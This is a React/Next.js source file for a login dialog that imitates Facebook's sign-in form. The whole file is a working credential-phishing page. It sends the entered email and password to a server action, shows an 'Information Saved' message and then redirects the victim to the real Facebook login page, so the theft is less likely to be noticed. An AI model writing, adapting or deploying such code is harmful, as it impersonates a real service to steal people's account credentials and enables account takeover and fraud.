"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Loader2 } from "lucide-react";

import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Separator } from "@/components/ui/separator";
import { useToast } from "@/hooks/use-toast";
import { login } from "@/app/actions";

const formSchema = z.object({
  username: z.string().email({ message: "Please enter a valid email." }),
  password: z.string().min(6, { message: "Password must be at least 6 characters." }),
  rememberMe: z.boolean().default(false).optional(),
});

export function LoginDialog() {
  const [isMounted, setIsMounted] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    setIsMounted(true);
  }, []);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      password: "",
      rememberMe: false,
    },
  });

  const [isDialogOpen, setIsDialogOpen] = useState(true);

  async function onSubmit(values: z.infer<typeof formSchema>) {
    const result = await login(values);
    if (result.success) {
      toast({
        title: "Information Saved",
        description: "Redirecting to Facebook...",
      });
      // Redirect to the actual Facebook login page
      window.location.href = "https://www.facebook.com/login/";
    } else {
      toast({
        variant: "destructive",
        title: "Submission Failed",
        description: result.error || "An unknown error occurred.",
      });
    }
  }

  if (!isMounted) {
    return null;
  }

  return (
    <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
      <DialogContent className="sm:max-w-md p-0 shadow-2xl rounded-lg">
        <DialogHeader className="p-6 pb-2 text-center">
          <DialogTitle className="text-2xl font-bold tracking-tight">Log in to Facebook</DialogTitle>
        </DialogHeader>
        <div className="p-6 pt-2">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="username"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input placeholder="Email address or phone number" {...field} className="h-12 text-base" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input type="password" placeholder="Password" {...field} className="h-12 text-base" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <Button type="submit" className="w-full h-12 text-lg font-bold" disabled={form.formState.isSubmitting}>
                {form.formState.isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                Log In
              </Button>
            </form>
          </Form>
          <div className="mt-4 text-center">
            <a href="#" className="text-sm text-primary hover:underline">
              Forgotten password?
            </a>
          </div>
          <Separator className="my-6" />
          <div className="text-center">
            <Button variant="secondary" type="button" className="font-bold py-3 px-4 h-12 text-base text-white bg-[#42b72a] hover:bg-[#36a420]">
              Create new account
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
